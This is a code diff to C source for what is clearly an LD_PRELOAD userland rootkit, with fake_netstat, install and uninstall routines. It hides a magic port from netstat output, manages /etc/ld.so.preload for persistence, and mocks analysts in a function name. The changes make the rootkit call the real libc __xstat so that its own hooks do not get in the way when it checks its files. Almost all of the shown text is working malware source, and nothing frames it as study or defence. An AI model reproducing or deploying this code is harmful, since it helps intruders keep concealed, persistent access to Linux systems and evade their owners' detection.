@@ -76,6 +76,9 @@ int fake_netstat(char *pathname, char *newfile){
     if(!hooked_fopen){
         hooked_fopen = load_libc("fopen");
     }
+    if(!hooked_xstat){
+        hooked_xstat = load_libc("__xstat");
+    }
     FILE *real_fp = hooked_fopen(pathname, "r");
     if (!real_fp){
         return 0;
@@ -90,7 +93,7 @@ int fake_netstat(char *pathname, char *newfile){
     int maxp = 1;
     sprintf(ports[0], ":%04X ", MAGIC_PORT);
 
-    if (stat(PORTSPOOF_FILE, &buffer) == 0){
+    if (hooked_xstat(_STAT_VER, PORTSPOOF_FILE, &buffer) == 0){
         FILE *pf = hooked_fopen(PORTSPOOF_FILE, "r");
         char line[32];
         do {
@@ -163,8 +166,11 @@ void OH_YOU_THINK_YOU_ARE_A_GREAT_HACKER_BY_LOOKING_AT_STRINGS_AND_SHIT_YOU_IDIO
  *  returns: nothing
  */
 void install(){
+    if(!hooked_xstat){
+        hooked_xstat = load_libc("__xstat");
+    }
     struct stat buffer;
-    if (stat(MAGIC_LIBPATH, &buffer) == 0){
+    if (hooked_xstat(_STAT_VER, MAGIC_LIBPATH, &buffer) == 0){
         return;
     }
     Dl_info dl_info;
@@ -248,7 +254,7 @@ void uninstall(){
     unsigned long flags = 0;
     struct stat buffer;
 
-    if (stat(MAGIC_LIBPATH, &buffer) == 0){
+    if (hooked_xstat(_STAT_VER, MAGIC_LIBPATH, &buffer) == 0){
         FILE *f = hooked_fopen(MAGIC_LIBPATH, "rb");
         if (!f){
             #ifdef DEBUG
@@ -263,7 +269,7 @@ void uninstall(){
     }
 
     char ldpath[] = "/etc/ld.so.preload";
-    if (stat(ldpath, &buffer) == 0){
+    if (hooked_xstat(_STAT_VER, ldpath, &buffer) == 0){
         FILE *fld = hooked_fopen(ldpath, "r");
         if (!fld){
             #ifdef DEBUG
